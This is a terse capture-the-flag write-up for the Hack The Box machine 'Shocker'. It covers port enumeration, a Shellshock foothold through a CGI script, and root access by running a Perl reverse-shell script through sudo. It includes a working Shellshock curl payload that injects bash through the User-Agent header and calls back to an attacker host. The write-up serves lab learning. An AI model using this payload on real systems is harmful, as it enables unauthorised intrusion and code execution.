Name & IP Address of Machine:
> SHOCKER : `10.10.10.56`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->



## Synopsis


## Enumeration
Opened Ports: 
- [ ] 80 (WEB-SERVER)
- [ ] 2222 (SSH) -> Wierd

## FootHold
The name of the box is a huge hint to test for shellshock vulnerability. When testing, successs.
Find a bash script in cgi-bin and then confirm the rce via following request.
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'curl http://10.10.14.28:8000/etc'" http://127.0.0.1:8000/cgi-bin/user.sh
```

## Lateral Movement
Got `shelly`. run sudo -l and you can see shelly user can run perl with sudo.

## Privilege Escalation

write a perl script(rev.pl) and get rce. 
```bash
sudo /usr/bin/perl rev.pl
```



<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->